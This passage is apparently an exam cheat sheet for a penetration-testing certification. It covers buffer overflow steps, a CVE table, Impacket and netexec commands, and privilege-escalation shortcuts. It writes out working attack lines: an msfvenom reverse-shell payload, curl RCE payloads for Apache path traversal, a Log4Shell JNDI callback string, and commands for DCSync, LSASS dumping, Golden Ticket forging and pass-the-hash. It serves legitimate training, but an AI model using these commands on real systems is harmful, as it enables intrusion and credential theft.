> Generates a unique, non-repeating cyclical text pattern to determine the exact payload offset needed to control the EIP register.
> 
> Bash
> 
> Bash
> 
> ```
> msf-pattern_create -l <CRASH_LENGTH>
> ```

> [!check] 💬 Immunity Debugger: Calculating Explicit Distance Metrics targeting the EIP Pointer Registers
> 
> Uses Mona inside Immunity Debugger to analyze memory state registers and find the exact byte offset that overwrites EIP.
> 
> Plaintext
> 
> ```
> !mona findmsp -distance <CRASH_LENGTH>
> ```

### ── Step 3: Verify EIP Control ───────────────────────────────

Python

```
# Configure a tracking payload to verify explicit register control:
# payload = b"A" * OFFSET + b"B" * 4 + b"C" * (2000 - OFFSET - 4)
# Upon execution, the EIP register state in the debugger must read precisely: 42424242
```

### ── Step 4: Bad Chars ────────────────────────────────────────

> [!check] 💬 Immunity Debugger: Generating Hex Byte Arrays to Identify Bad Character Droppers Exclusion Lists
> 
> Generates a master byte reference array to compare against memory and identify characters that cause payload corruption or execution failures.
> 
> Plaintext
> 
> ```
> !mona bytearray -b "\x00"
> # Compares the reference byte array against data loaded at the ESP address stack point:
> !mona compare -f C:\mona\bytearray.bin -a <ESP_ADDRESS>
> ```

### ── Step 5: JMP ESP ──────────────────────────────────────────

> [!check] 💬 Immunity Debugger: Identifying Unprotected Dynamic Assembly Execution Jump Pointers
> 
> Searches system application modules to locate a stable `JMP ESP` address instruction that is not protected by ASLR or DEP security controls.
> 
> Plaintext
> 
> ```
> !mona jmp -r esp -cpb "\x00\x0a\x0d"  # Excludes identified bad character strings from the search results
> ```

> [!example] 🐧 Linux Bash: Compiling Target Evasive Windows Architecture Payload Byte Arrays
> 
> Compiles a reverse shell payload array while filtering out isolated bad characters to prevent shell corruption.
> 
> Bash
> 
> Bash
> 
> ```
> msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f python -b "\x00\x0a\x0d" EXITFUNC=thread
> ```

### ── Step 7: Final Exploit ────────────────────────────────────

> [!example] 🐍 Python Script: Consolidated Buffer Overflow Exploit Blueprint Construction File Template
> 
> Integrates the calculated offset, the JMP ESP address pointer, a NOP sled buffer, and the generated shellcode into a final exploit script.
> 
> Python
> 
> Python
> 
> ```
> from struct import pack
>  
> offset   = <OFFSET_VALUE>
> jmp_esp  = pack("<I", <JMP_ESP_ADDRESS>)  # Converts address to little-endian format
> nops     = b"\x90" * 16                   # Creates padding space for the NOP sled
> # Paste the compiled msfvenom byte array string here as the shellcode payload:
> # shellcode = b"..."
>  
> payload = b"A" * offset + jmp_esp + nops + shellcode
> ```

# COMMON CVEs & EXPLOITS

## High-Value CVE Quick Reference

> [!quote] 🌳 Mappings: Elite Common Vulnerabilities & Public Exploits Reference Matrix
> 
> Direct mapping tracking high-yield corporate CVE records, vulnerability scopes, and verified execution lines.
> 
> Plaintext
> 
> ```
> CVE / EXPLOIT        TARGET HOST NODES              OPERATIONAL IMPACT / COMMAND STRINGS
> ─────────────────────────────────────────────────────────────────
> MS17-010 EternalBlue Win7/2008 R2 (SMB v1 engine)   → Gains SYSTEM execution authority
>    Verification: smb-vuln-ms17-010; manual framework: helperlibs; Metasploit module: ms17_010
>  
> CVE-2019-0708 BlueKeep  Win7/2008 RDP terminal core → Gains RCE / SYSTEM context shell
>    Metasploit module: cve_2019_0708_bluekeep_rce (Warning: high system crash risk)
>  
> CVE-2021-41773       Apache 2.4.49 path traversal  → Gains direct RCE command control
>    curl -s 'http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo;id'
>  
> CVE-2021-42013       Apache 2.4.50 traversal bypass → Gains direct RCE command control
>    curl -s 'http://<IP>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d 'echo;id'
>  
> CVE-2021-3156 Baron  Sudo engine builds < 1.9.5p2    → Escalates locally to root access
>    sudoedit -s '\' $(python3 -c 'print("A"*65536)')
>  
> CVE-2021-4034 PwnKit pkexec tool on major distros   → Escalates locally to root access
>    Requires local script compilation: https://github.com/ly4k/PwnKit
>  
> CVE-2022-0847 DirtyPipe Kernel releases 5.8-5.16.11 → Escalates locally to root access
>    Bypasses access controls to write directly to read-only files → overwrite /etc/passwd root flags
>  
> CVE-2016-5195 DirtyCow Older kernel releases < 4.8.3 → Escalates locally to root access
>  
> CVE-2021-44228 Log4Shell Log4j 2.x Java application → Gains remote code execution (RCE)
>    Inject parameter payload string: ${jndi:ldap://<LHOST>:1389/a} across evaluated request headers
>  
> CVE-2021-1675/34527 Windows Print Spooler service → Gains SYSTEM remote code execution (RCE)
>    SharpPrintNightmare.exe \\<TARGET_IP> C:\path\to\uploaded_backdoor_payload.dll
>  
> CVE-2022-26134 Confluence 7.4.17 OGNL platform     → Gains remote code execution (RCE)
>    curl 'http://<IP>/%24%7B%40com.opensymphony.xwork2.ActionContext...'
>  
> CVE-2023-4966 Citrix Bleed Citrix ADC / Gateway core → Extracts active user session memory maps
> ```

## SearchSploit Workflow

> [!check] 🐧 Linux Bash: Indexing Local Exploit-DB Records Repositories for Public Vulnerability Matches
> 
> Searches the offline database repository for public exploit scripts matching a specific service version or protocol.
> 
> Bash
> 
> Bash
> 
> ```
> searchsploit apache 2.4
> searchsploit "windows smb" remote
> searchsploit -w openssh 7.2    # Displays matching Exploit-DB data URLs online
> ```

> [!check] 🐧 Linux Bash: Moving Targeted Exploit Scripts into Current Operational Workspace Folder
> 
> Copies an exploit script from the master repository directly into the current workspace folder using its unique ID.
> 
> Bash
> 
> Bash
> 
> ```
> searchsploit -m 47837          # Copies exploit script file number 47837
> ```

> [!check] 🐧 Linux Bash: Non-Destructive Code Inspection of Discovered Exploit Script File Lines
> 
> Opens and reviews the source code of an exploit script to analyze its logic and configure parameters before execution.
> 
> Bash
> 
> Bash
> 
> ```
> searchsploit -x 47837
> ```

> [!check] 🐧 Linux Bash: Synchronizing Local Exploit Databases with Remote Public Master Lists
> 
> Connects online to download the latest security updates, exploit scripts, and CVE tracking additions.
> 
> Bash
> 
> Bash
> 
> ```
> searchsploit -u
> ```

> [!check] 🐧 Linux Bash: Filtering Security Exploitation Search Layouts by Operating System Architecture
> 
> Filters search results to isolate specific target environments and programming languages.
> 
> Bash
> 
> Bash
> 
> ```
> searchsploit --os windows --type webapps php
> ```

# EXAM DAY TIPS

## Before Starting (15 Min Preparation)

> [!abstract] 🌳 Markdown List: Pre-Flight Network Connection and Ingress Environment Tracking Configuration Checklist
> 
> Set of mandatory environment verification steps to run prior to starting initialization scans on the targets.
> 
> Plaintext
> 
> ```
> ☐ Establish connection to the exam VPN — verify target availability parameters: ping -c 3 <DC_IP>
> ☐ Document target IP data across scope: note specific DC, MS01, MS02, Box1, Box2, and Box3 strings
> ☐ Update local /etc/hosts parameters mapping out IP strings to discovered target hostnames
> ☐ Build local directory tree structures to store text logs, exploits, and evidence per target machine
> ☐ Create tracking markdown notes files for each machine scope to log credentials and commands
> ☐ Verify local screenshot selection tools are active and responsive (Flameshot utility setup)
> ☐ Initialize automated port scans against all assigned target IP ranges concurrently
> ☐ Configure Tmux layouts dedicating unique workspace terminal windows per target machine
> ☐ Record provided initial Active Directory authentication profiles at the top of your master notes file
> ```

## Notes Template Per Machine

Markdown

```
## Machine Target: <HOSTNAME> — <IP_ADDRESS> — <OS_FAMILY>
**Current Status:** In Progress / Account Privileges Captured
**Flag Extractions:**
- local.txt token string:  ________________
- proof.txt token string:  ________________

### Isolated Ports / Active Services
| Port | Service Type | Version String | Notes / Configuration Observations |
|------|--------------|----------------|------------------------------------|
| 80   | HTTP service | Apache 2.4.49  | Confirmed vulnerable to path traversal variables |

### Actioned Attack Path
1. [ ] Initial Discovery: executed Gobuster directory fuzzer → located hidden /admin endpoint
2. [ ] Traversal Exploitation: sent path traversal parameters inside file query → verified read access on /etc/passwd
3. [ ] Log Poisoning: injected malicious execution payload inside User-Agent strings → generated RCE gateway
4. [ ] Local PrivEsc Search: executed linpeas audit framework → discovered active SUID flag on /usr/bin/python3
5. [ ] Root Privilege Elevation: referenced SUID breakout rules via GTFObins inside python → caught root shell

### Shell Commands Executed (Preserve for reporting copy-paste)
...

### Capture Validation Screenshots
- [ ] Captured low-priv user flag showing local.txt contents + identity group output via whoami + host IP
- [ ] Captured administrative root flag showing proof.txt contents + SYSTEM context output via whoami + host IP
```

## Critical Exam Rules

> [!abstract] 🌳 Markdown List: Strict Points Protection and Rule Verification Matrix Checklist
> 
> Key testing conditions and data formatting rules required to protect flag points during the evaluation.
> 
> Plaintext
> 
> ```
> ☐ Ensure flag verification screenshots show the token string, user context (whoami), hostname, and IP configuration.
> ☐ Execute consolidated single-line command strings to output all required validation tokens at the same time.
>     Linux single-line layout:   cat /home/user/local.txt && whoami && hostname && ip addr show
>     Windows single-line layout: type C:\Users\Admin\Desktop\proof.txt & whoami & hostname & ipconfig /all
> ☐ Abide by framework use restrictions: Metasploit usage is limited to one single target host across the entire exam.
> ☐ Payload generation utilities like msfvenom are permitted across all machines to output basic connection payloads.
> ☐ Take screenshots immediately upon extracting any user or root token to prevent data loss from network drops.
> ☐ Check multiple system paths if flags are missing from standard desktop folders within Active Directory targets.
>     Windows deep folder search command string: dir /s /b C:\*.txt 2>nul | findstr "local\|proof"
> ```

## Stuck? 15-Point Reset Checklist

> [!abstract] 🌳 Markdown List: Elite Time Window Management and Target Analysis Redirection Checklist
> 
> Tactical pivot checklist to follow if an attack vector stalls or fails to yield progress within a 45-minute window.
> 
> Plaintext
> 
> ```
> Target testing timeline limit per vector: 45 minutes. If stalled → STOP → walk systematically through this review list:
> 
> ☐ 1.  Did the port scan sweep the entire keyspace? Ensure -p- was run to avoid missing non-standard ports.
> ☐ 2.  Was UDP enumeration completed? Check for active UDP systems on port 161 running SNMP services.
> ☐ 3.  Was the target web page source code fully reviewed? Check via Ctrl+U to uncover comments or hidden fields.
> ☐ 4.  Have common infrastructure folders been checked manually? Look for robots.txt, /.git stores, or /.env parameters.
> ☐ 5.  Have all discovered credentials and hash tokens been tested across every open network protocol?
> ☐ 6.  Have standard default credentials been tested against login fields? Check combinations like admin:admin or sa:blank.
> ☐ 7.  Have exact software version numbers been cross-referenced with public exploit sites and online CVE databases?
> ☐ 8.  Has SearchSploit been run against all identified network service versions and application names?
> ☐ 9.  Have accessible SMB shares been reviewed and their configuration properties downloaded for text parsing?
> ☐ 10. Has automated or manual SQL injection testing been completed on every discovered web parameter input field?
> ☐ 11. Have path traversal and file inclusion strings been tested against all file loading or page navigation arguments?
> ☐ 12. Have local audit logs from running LinPeas or WinPEAS been reviewed fully? Check highlighted red/yellow lines.
> ☐ 13. Have native privilege checks been completed manually? Look for sudo -l definitions, SUID files, or capabilities.
> ☐ 14. Have file lookups been run across standard directories to locate custom scripts, database passwords, or history files?
> ☐ 15. Am I overcomplicating the attack path? Step back to evaluate simpler configurations or basic deployment flaws.
> ```

## AD-Specific Tips

> [!abstract] 🌳 Markdown List: Enterprise Networks Post-Ingress Pivot Analysis Matrix Checklist
> 
> Tactical principles for evaluating domain environments and pivoting cleanly through Active Directory networks.
> 
> Plaintext
> 
> ```
> ☐ Authenticate via provided credentials to launch BloodHound first, revealing the shortest attack paths to Domain Admin.
> ☐ Scan LDAP user attributes to check account descriptions for plaintext credentials left by administrators.
> ☐ Enumerate the domain SYSVOL share within the first 10 minutes to extract Group Policy cpassword strings.
> ☐ Execute Kerberoasting and AS-REP roasting checks immediately upon validating low-privilege domain access.
> ☐ Test all discovered passwords and hash strings across adjacent network nodes to leverage password reuse patterns.
> ☐ Target and exploit object control relationships (such as GenericAll or WriteDacl ACE rules) to take over users.
> ☐ Enumerate MSSQL instances to check for linked servers, checking if service accounts hold elevated domain permissions.
> ☐ Use NetExec user listing flags alongside BloodHound results to uncover additional active account properties.
> ☐ Re-run BloodHound collection from within compromised systems to map internal parameters after gaining host access.
> ```

## Common Rabbit Holes (Avoid These)

> [!abstract] 🌳 Markdown List: Destructive Evasion Traps and Anti-Patterns Checklist
> 
> Common anti-patterns and time-wasting traps to avoid during the network testing phase.
> 
> Plaintext
> 
> ```
> ✗ Spending time running unstable kernel exploits before checking for simple configuration or permission errors
> ✗ Running brute-force attacks against SSH using massive dictionaries like rockyou, which causes high network noise
> ✗ Missing credential leaks or valid user lists by ignoring stateless UDP port scanning on SNMP port 161
> ✗ Forgetting to test a discovered password across other open services or adjacent machine profiles
> ✗ Running automated web directory fuzzers for hours against completely static web pages lacking dynamic parameters
> ✗ Stalling on a single attack path or payload variation for over 45 minutes without switching focus
> ✗ Assuming an accessible database lacks external server links without querying linked configurations explicitly
> ✗ Forgetting to extract plaintext history profiles stored within the PowerShell ConsoleHost_history.txt log file
> ✗ Missing database passwords by failing to check application configuration parameters like web.config files
> ✗ Abandoning custom SUID file evaluation without checking utility breakout rules listed on GTFObins
> ```

# PROOF COLLECTION CHECKLIST

## Required Screenshot Per Machine

> [!check] 🐧 Linux Bash: Low-Privilege Local Session Environment Configuration Flag Extraction Verification
> 
> Outputs the low-privilege user flag along with system parameters to confirm initial access.
> 
> Bash
> 
> Bash
> 
> ```
> cat /home/<USERNAME>/local.txt && whoami && id && hostname && ip addr show
> ```

> [!success] 🐧 Linux Bash: High-Privilege Administrative System Flag Extraction Verification
> 
> Outputs the root domain flag along with system parameters to confirm full root privilege escalation.
> 
> Bash
> 
> Bash
> 
> ```
> cat /root/proof.txt && whoami && id && hostname && ip addr show
> ```

> [!check] 💾 Windows CMD: Low-Privilege User Account Desktop Volatile Flag Extraction Verification
> 
> Displays the low-privilege user flag along with Windows configuration parameters to verify account access.
> 
> DOS
> 
> DOS
> 
> ```
> type C:\Users\<USERNAME>\Desktop\local.txt & whoami & hostname & ipconfig
> ```

> [!success] 💾 Windows CMD: Elevated Context Administrator System Desktop Flag Extraction Verification
> 
> Displays the administrative flag along with full system network profiles to verify complete host compromise.
> 
> DOS
> 
> DOS
> 
> ```
> type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig /all
> ```

> [!success] 💾 Windows CMD: System Level Impersonated Handle Full Token Group Mapping Flag Extraction Verification
> 
> Displays the administrative flag alongside complete token privilege properties to document potato-based escalation success.
> 
> DOS
> 
> DOS
> 
> ```
> type C:\Users\Administrator\Desktop\proof.txt & whoami /all & hostname & ipconfig
> ```

## Proof File Locations Reference

> [!abstract] 🌳 Markdown List: Default Flag Database Storage Paths Matrix Checklist
> 
> Standard filesystem locations for user and administrative tokens on both Linux and Windows systems.
> 
> Plaintext
> 
> ```
> Target Linux Token Paths:
>      /root/proof.txt            ← Target file location (requires elevated root access permissions)
>      /home/<user>/local.txt     ← Target user folder location (accessible via low privilege sessions)
> 
> Target Windows Token Paths:
>      C:\Users\Administrator\Desktop\proof.txt   ← Administrative flag (requires admin or SYSTEM access)
>      C:\Users\<user>\Desktop\local.txt         ← Standard user flag (accessible via local session profile)
>      Alternative target locations to evaluate: Documents folders, root of C:\ storage path
> 
> If flag files are hidden or stored outside standard folders:
>      Linux deep traversal string:    find / -name "*.txt" 2>/dev/null | xargs grep -l "OS{" 2>/dev/null
>      Windows deep traversal string:  dir /s /b C:\local.txt C:\proof.txt 2>nul
>                                      dir /s /b C:\*.txt 2>nul | findstr "local\|proof"
> ```

## Final Verification Before Ending Exam

> [!abstract] 🌳 Markdown List: Consolidated Grading Vault Matrix and Report Tracking Checklist
> 
> Summary tracking sheet to confirm point accumulation and verify all evidence meets documentation standards before ending the exam.
> 
> Plaintext
> 
> ```
> POINT ACCUMULATION TRACKER:
> ☐ AD Entry Node MS01  — local.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ AD Internal Host MS02— local.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ AD Controller DC     — proof.txt flag captured  = 20 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ Standalone Node Box1 — local.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ Standalone Node Box1 — proof.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ Standalone Node Box2 — local.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ Standalone Node Box2 — proof.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ Standalone Node Box3 — local.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> ☐ Standalone Node Box3 — proof.txt flag captured  = 10 points | Flag Token: ________________ | Verification Image Saved: ☐
> 
> CURRENT TOTAL GRADED SELECTION:       /100 points  |  MINIMUM REQ PASS THRESHOLD VALUE: 70 points
> 
> EXAM REPORTING READINESS CHECKS:
> ☐ Verify all evidence screenshots clearly display the flag token string, user identity, system hostname, and network IP details.
> ☐ Confirm local documentation contains sufficient detail, parameters, and command strings to completely reproduce each step.
> ☐ Check that all custom exploit modifications and code adjustments are preserved to assist the 24-hour report writing phase.
> ☐ Verify that Metasploit automation frameworks were only leveraged against a single target node during the engagement.
> ☐ Ensure the reporting template is prepared and formatted to begin generating the final report deliverable immediately.
> ```

# QUICK REFERENCE CARD

## Essential Listeners

> [!abstract] 🐧 Linux Bash: Traditional Inbound Ingress Process Port Standalone Listeners
> 
> Opens a standard Netcat port listener to catch incoming unencrypted reverse shells from target systems.
> 
> Bash
> 
> Bash
> 
> ```
> nc -lvnp 4444
> ```

> [!abstract] 🐧 Linux Bash: Stabilized Terminal Listener Engine with Local History Readline Processing
> 
> Wraps Netcat in a readline interface to enable command line history and input stabilization on the captured shell.
> 
> Bash
> 
> Bash
> 
> ```
> rlwrap nc -lvnp 4444
> ```

> [!abstract] 🐧 Linux Bash: Initializing Background In-Framework Inbound Connection Handlers
> 
> Starts a backgrounded multi/handler session inside Metasploit to catch incoming connections matching specific payload settings.
> 
> Bash
> 
> Bash
> 
> ```
> msfconsole -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; run -j"
> ```

## Impacket Cheatsheet

> [!example] 🐧 Linux Bash: Spawning Full SYSTEM Administrative Context Process via SMB Protocols
> 
> Uses PsExec to remotely upload and execute a service binary, dropping into an interactive SYSTEM shell on a target where admin rights are held.
> 
> Bash
> 
> Bash
> 
> ```
> psexec.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Semi-Interactive Remote Management Console Thread Execution over WMI Ports
> 
> Uses WMIExec to execute commands remotely on a target, returning output via an administrative shell path without dropping binary files to disk.
> 
> Bash
> 
> Bash
> 
> ```
> wmiexec.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Evasive Remote Command Processor Spawning without Executable File Drops
> 
> Uses SMBExec to create an execution path using built-in command interpreters, avoiding the use of uploaded service binaries.
> 
> Bash
> 
> Bash
> 
> ```
> smbexec.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Spawning One-Off Commands Process Threads via Scheduled Task Automations
> 
> Uses ATExec to execute single command lines remotely on a target by registering and running them as scheduled tasks.
> 
> Bash
> 
> Bash
> 
> ```
> atexec.py dom/user:pass@<TARGET_IP> "whoami"
> ```

> [!example] 🐧 Linux Bash: Remote Authentication Access Verification via Injected User NT Hashes Strings
> 
> Bypasses plaintext password requirements by passing NTLM hash strings to authenticate remotely across target management utilities.
> 
> Bash
> 
> Bash
> 
> ```
> psexec.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
> wmiexec.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
> secretsdump.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
> ```

> [!warning] 🐧 Linux Bash: Authenticated Harvesting of Domain SPN Service Ticket Matrices
> 
> Requests Kerberos service tickets for accounts with configured Service Principal Names to extract their hashes for offline cracking.
> 
> Bash
> 
> Bash
> 
> ```
> GetUserSPNs.py dom/user:pass -dc-ip <DC_IP> -request
> ```

> [!warning] 🐧 Linux Bash: Requesting Network Ticket Accounts Data Lacking Pre-Authentication Protections
> 
> Requests authentication tickets for domain accounts that have Kerberos pre-authentication disabled to harvest crackable hashes.
> 
> Bash
> 
> Bash
> 
> ```
> GetNPUsers.py dom/user:pass -dc-ip <DC_IP> -request
> ```

> [!check] 🐧 Linux Bash: Remote Replication Protocol Replication Ingestion Queries
> 
> Performs a DCSync attack to remotely harvest password hashes from a domain controller using replication rights.
> 
> Bash
> 
> Bash
> 
> ```
> secretsdump.py dom/user:pass@<DC_IP> -just-dc
> ```

> [!check] 🐧 Linux Bash: Harvesting Network Domain User Identity Security Account Manager Signatures
> 
> Queries SAM databases over the network via SID filtering to enumerate active account names and map target domains.
> 
> Bash
> 
> Bash
> 
> ```
> lookupsid.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Generating Inbound Domain Compute Accounts Entities inside Active Directory trees
> 
> Injects a new machine account into the Active Directory domain schema to support downstream delegation attacks.
> 
> Bash
> 
> Bash
> 
> ```
> addcomputer.py dom/user:pass -computer-name FAKE$
> ```

> [!example] 🐧 Linux Bash: Requesting an Impersonated User Token Service Ticket over Network Channels
> 
> Abuses delegation rules via S4U protocols to request an administrative service ticket for a target service.
> 
> Bash
> 
> Bash
> 
> ```
> getST.py -spn cifs/<TARGET_FQDN> -impersonate Admin dom/user:pass
> ```

> [!example] 🐧 Linux Bash: Creating Persistent Core Enterprise Privilege Elevation Tickets
> 
> Forges a persistent Golden Ticket using a stolen domain SID and `krbtgt` hash string to maintain domain admin access.
> 
> Bash
> 
> Bash
> 
> ```
> ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain dom Admin
> ```

> [!check] 🐧 Linux Bash: Remote Authenticated Inbound Database Ingest Connections
> 
> Connects remotely to a targeted SQL Server instance, passing active domain credentials via Windows authentication tokens.
> 
> Bash
> 
> Bash
> 
> ```
> mssqlclient.py dom/user:pass@<TARGET_IP> -windows-auth
> ```

> [!check] 🐧 Linux Bash: Remote Connections Mapping using Local SQL Database Account Credentials
> 
> Connects directly to an MSSQL instance using native database account credentials (such as `sa`).
> 
> Bash
> 
> Bash
> 
> ```
> mssqlclient.py sa@<TARGET_IP>
> ```

## netexec / CME Cheatsheet

> [!check] 🐧 Linux Bash: Broad Range Network Target Access Profile Ingress Credentials Validation Check
> 
> Validates credentials against a target IP address over SMB to check for active network access.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass
> ```

> [!check] 🐧 Linux Bash: Network Ingress Authentication via Pass-The-Hash Account Validation Injections
> 
> Verifies local or domain access permissions by authenticating over SMB using an NTLM hash string.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -H <NTLM_HASH>
> ```

> [!check] 🐧 Linux Bash: Broad Subnet Range Multi-Account Sprays Tracking Accessible Targets
> 
> Tests a credentials list across an entire network subnet to automatically identify accessible hosts and valid account pairs.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <SUBNET>/24 -u user -p pass --continue-on-success
> ```

> [!check] 🐧 Linux Bash: Extracting Available Shared Volumes Partition Configurations from Connected Nodes
> 
> Connects using valid credentials to list all available shares and map their access levels on the remote host.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --shares
> ```

> [!check] 🐧 Linux Bash: Indexing Active Directory Enterprise Domain User Accounts Matrices
> 
> Queries the domain controller to extract and map out the complete list of active domain user accounts.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --users
> ```

> [!check] 🐧 Linux Bash: Mapping Corporate Domain Security Groups Relationships Frameworks
> 
> Harvests and outputs all configured domain security groups along with their current account memberships.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --groups
> ```

> [!check] 🐧 Linux Bash: Requesting Network Active Password Expiration and Complexity Matrix Policies
> 
> Extracts the password policy settings from the domain controller to review lockout thresholds and complexity rules.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --pass-pol
> ```

> [!check] 🐧 Linux Bash: Extracting Local Account Databases Hashes directly from Target Registries
> 
> Decrypts the local SAM database remotely using administrative credentials to dump all local account password hashes.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --sam
> ```

> [!check] 🐧 Linux Bash: Extracting Local Security Authority Cleartext Access Secrets from Target Storage
> 
> Connects remotely to extract cached LSA secrets, plain text service passwords, and machine keys from target storage.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --lsa
> ```

> [!check] 🐧 Linux Bash: Automated In-Memory Extraction of Active Session Plaintext Tokens
> 
> Leverages the lsassy module to remotely dump the LSASS memory space and extract cached plaintext credentials or hash tokens.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -M lsassy
> ```

> [!check] 🐧 Linux Bash: Harvesting Hardcoded Group Policy Preferences Passwords from Domain Configuration Volumes
> 
> Parses the SYSVOL share configuration records automatically to locate and decrypt Group Policy passwords.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -M gpp_password
> ```

> [!check] 🐧 Linux Bash: Executing Shell Command Processes via Target Operating System Command Interpreters
> 
> Runs shell commands remotely on a target using administrative privileges, returning output directly to the terminal.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -x "whoami"
> ```

> [!check] 🐧 Linux Bash: Direct In-Memory Script Pipeline Processing via PowerShell Execution Handlers
> 
> Executes custom PowerShell scripts remotely on a target using administrative access, running the code directly inside memory.
> 
> Bash
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -X "whoami"
> ```

> [!check] 🐧 Linux Bash: Testing Inbound Network Access Authorization over Remote WinRM Management Endpoints
> 
> Verifies account access controls over port 5985 to check for valid remote command line management privileges.
> 
> Bash
> 
> Bash
> 
> ```
> nxc winrm <TARGET_IP> -u user -p pass
> ```

> [!check] 🐧 Linux Bash: Testing Database Target Authentication Ingress over Local SQL Instance Links
> 
> Tests database credentials against an open MSSQL port to check for valid instance permissions.
> 
> Bash
> 
> Bash
> 
> ```
> nxc mssql <TARGET_IP> -u sa -p pass --local-auth
> ```

> [!check] 🐧 Linux Bash: Submitting Direct Transact-SQL Statement Queries to Remote Database Engines
> 
> Submits a Transact-SQL statement query directly to a remote database engine to return version information or parameters.
> 
> Bash
> 
> Bash
> 
> ```
> nxc mssql <TARGET_IP> -u sa -p pass -q "SELECT @@version"
> ```

> [!check] 🐧 Linux Bash: Uploading External Binary Payloads through Active Database Service Connections Links
> 
> Uses database permissions to upload a local binary payload directly onto the remote file system paths of a target SQL server.
> 
> Bash
> 
> Bash
> 
> ```
> nxc mssql <TARGET_IP> -u sa -p pass --put-file /tmp/nc.exe C:\\Temp\\nc.exe
> ```

## Key File Locations

> [!info] 🌳 Markdown List: Linux Corporate Node File Partition Key Secrets Repositories Checklist
> 
> High-value filesystem paths to investigate immediately upon capturing access on a Linux target.
> 
> Plaintext
> 
> ```
> LINUX HIGH-VALUE PATHS:
> /etc/passwd, /etc/shadow              → Account metadata databases and secure user password hashes
> /etc/crontab, /var/spool/cron/        → Automated cron tables and routine background script allocations
> /home/*/.bash_history                 → Extracted cleartext command records from past terminal sessions (HIGH YIELD)
> /home/*/.ssh/id_rsa                   → Private cryptographic authentication keys held on storage
> /home/*/.ssh/authorized_keys          → Exposed authorization lists (allows injection of public keys)
> /var/www/html/                        → Web deployment roots containing configuration files and database credentials
> /opt/                                 → Installation directory for custom server scripts and third-party tools
> /tmp/, /dev/shm/                      → World-writable filesystem spaces suitable for hosting staging utilities
> /proc/self/environ                    → Running system parameters and in-memory environment properties
> ```

> [!info] 🌳 Markdown List: Windows Infrastructure Node File Partition Secrets Vault Locations Checklist
> 
> High-value filesystem paths to search systematically upon gaining access on a Windows host.
> 
> Plaintext
> 
> ```
> WINDOWS HIGH-VALUE PATHS:
> C:\Windows\System32\config\SAM        → Local account security databases containing user password hashes
> C:\Windows\NTDS\ntds.dit              → Central Active Directory database stored on domain controllers
> C:\inetpub\wwwroot\web.config         → IIS configuration files containing application tokens and database credentials
> C:\xampp\passwords.txt                → Hardcoded credential backups stored by development packages
> C:\ProgramData\                       → Application configuration directories and hidden program stores
> C:\Users\*\AppData\Local\Microsoft\Credentials\  → Encrypted credential blobs cached by the vault system
> %APPDATA%\...\PSReadLine\ConsoleHost_history.txt → Plaintext history logs of PowerShell commands (HIGH YIELD)
> C:\Windows\Panther\unattend.xml       → Automated deployment configuration files containing plaintext passwords
> C:\Windows\system32\sysprep\sysprep.xml → System preparation setup data containing account credentials
> ```

## GTFObins Quick Reference

> [!example] 🐧 Linux Bash: Upgrading SUID Process Binary Execution Mappings via System Inherent Find Frameworks
> 
> Abuses elevated permissions on `find` to execute command parameters directly and open a root terminal session.
> 
> Bash
> 
> Bash
> 
> ```
> sudo find . -exec /bin/bash \; -p
> ```

> [!example] 🐧 Linux Bash: Elevating Writable Local Process Privileges via Scripting Engine Command Hooks
> 
> Uses an elevated Python runtime to bypass access restrictions and spawn an interactive shell with persistent privileges.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
> ```

> [!example] 🐧 Linux Bash: Spawning Privileged Root Terminals via Writable Perl Interpreter Binaries
> 
> Uses Perl's execution flags to open a privileged terminal session directly from the command line buffer.
> 
> Bash
> 
> Bash
> 
> ```
> perl -e 'exec "/bin/bash"'
> ```

> [!example] 🐧 Linux Bash: Spawning Privileged Root Terminals via Writable Ruby Execution Engines
> 
> Invokes core system processes inside Ruby to spawn an interactive shell with elevated permissions.
> 
> Bash
> 
> Bash
> 
> ```
> ruby -e 'exec "/bin/bash"'
> ```

